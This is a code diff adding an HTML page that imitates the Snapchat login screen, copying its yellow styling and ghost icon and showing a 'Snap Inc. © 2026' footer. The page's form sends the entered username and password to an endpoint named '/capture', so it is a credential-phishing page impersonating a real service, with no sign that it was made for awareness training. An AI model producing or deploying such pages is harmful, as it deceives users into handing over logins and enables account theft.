@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome!</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap');
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
+        
+        body {
+            min-height: 100vh;
+            background: url('https://www.snapchat.com/static/images/snapchat-background.png') center/cover;
+            background-color: #fffc00;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+        }
+        
+        .ghost {
+            width: 120px;
+            height: 120px;
+            background: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        .ghost svg { width: 60px; height: 60px; fill: #fffc00; }
+        
+        .card {
+            background: #fff;
+            border-radius: 16px;
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 8px;
+            color: #fffc00;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
+        }
+        .subtitle {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-bottom: 16px;
+            background: #f7f7f7;
+        }
+        input:focus { outline: none; border-color: #fffc00; background: #fff; }
+        
+        .btn-primary {
+            width: 100%;
+            background: #fffc00;
+            color: #000;
+            border: none;
+            border-radius: 24px;
+            padding: 16px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+        .btn-primary:hover { background: #e5e200; }
+        
+        .forgot {
+            color: #0fadff;
+            font-size: 14px;
+            text-decoration: none;
+            text-align: center;
+            display: block;
+        }
+        
+        .divider {
+            margin: 24px 0;
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .btn-secondary {
+            width: 100%;
+            background: #fff;
+            color: #000;
+            border: 1px solid #ddd;
+            border-radius: 24px;
+            padding: 16px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .signup {
+            margin-top: 24px;
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+        }
+        .signup a { color: #0fadff; text-decoration: none; font-weight: 600; }
+        
+        footer {
+            padding: 20px;
+            text-align: center;
+            color: rgba(0,0,0,0.6);
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="ghost">
+            <svg viewBox="0 0 24 24">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+            </svg>
+        </div>
+        
+        <div class="card">
+            <h1>👻 Welcome back!</h1>
+            <p class="subtitle">Log in to continue to Snapchat</p>
+            
+            <form action="/capture" method="POST">
+                <input type="text" name="username" placeholder="Username or Email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit" class="btn-primary">Log In</button>
+            </form>
+            
+            <a href="#" class="forgot">Forgot your password?</a>
+            
+            <div class="divider">or</div>
+            
+            <button class="btn-secondary">Sign Up</button>
+        </div>
+        
+        <p class="signup">New to Snapchat? <a href="#">Create an account</a></p>
+    </div>
+    
+    <footer>Snap Inc. © 2026</footer>
+</body>
+</html>
